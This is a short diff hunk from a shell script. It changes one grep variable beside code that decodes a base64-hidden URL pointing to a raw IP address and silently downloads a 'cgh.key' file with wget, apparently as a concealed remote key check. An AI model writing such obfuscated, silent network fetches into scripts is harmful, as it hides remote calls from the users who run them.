@@ -90,7 +90,7 @@ update1='IGh0dHA6Ly8zNS4xODMuMjA5Ljk4OjgxL2NnaC5rZXk='
 update2=$(echo $update1|$dom)
 wget -q $update2
 validar=$(cat < cgh.key)
-cat cgh.key | grep $buff > troyan.buf
+cat cgh.key | grep $key > troyan.buf
 pecho=$(cat < troyan.buf)
 cd
 cd
